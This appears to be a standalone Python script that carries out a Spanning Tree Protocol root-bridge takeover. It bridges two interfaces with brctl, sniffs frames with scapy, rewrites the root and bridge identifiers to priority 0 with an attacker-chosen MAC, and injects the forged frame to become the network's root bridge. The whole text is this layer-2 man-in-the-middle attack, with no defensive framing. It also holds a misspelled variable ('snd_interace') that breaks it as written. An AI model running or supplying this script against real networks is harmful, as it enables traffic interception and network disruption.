import sys
import subprocess
from scapy.all import *

if __name__ == "__main__":
    fst_interface = str(sys.argv[1])
    snd_interface = str(sys.argv[2])
    bridge_id = str(sys.argv[3])
    bridge_priority = str(sys.argv[4])

    # Create bridge br0 and link the interfaces and set priority.
    subprocess.call(['brctl', 'addbr', 'br0'])
    subprocess.call(['brctl', 'addif', 'br0', fst_interface])
    subprocess.call(['brctl', 'addif', 'br0', snd_interface])
    subprocess.call(['brctl', 'setbridgeprio', 'br0', bridge_priority])
    subprocess.call(['ip', 'link', 'set', 'dev', 'br0', 'up'])
    subprocess.call(['brctl', 'stp', 'br0', 'on'])

    # Sniff packets send from the interfaces (doesn't matter which one as they are both sent over the bridge).
    packet = sniff(count=5, iface=[fst_interface, snd_interace])
    # Modify the packet.
    packet[4].rootid=0
    packet[4].rootmac=bridge_id
    packet[4].bridgeid=0
    packet[4].bridgemac=bridge_id 
    # Send packet back into the network.
    sendp(packet[4], loop=0, verbose=0)



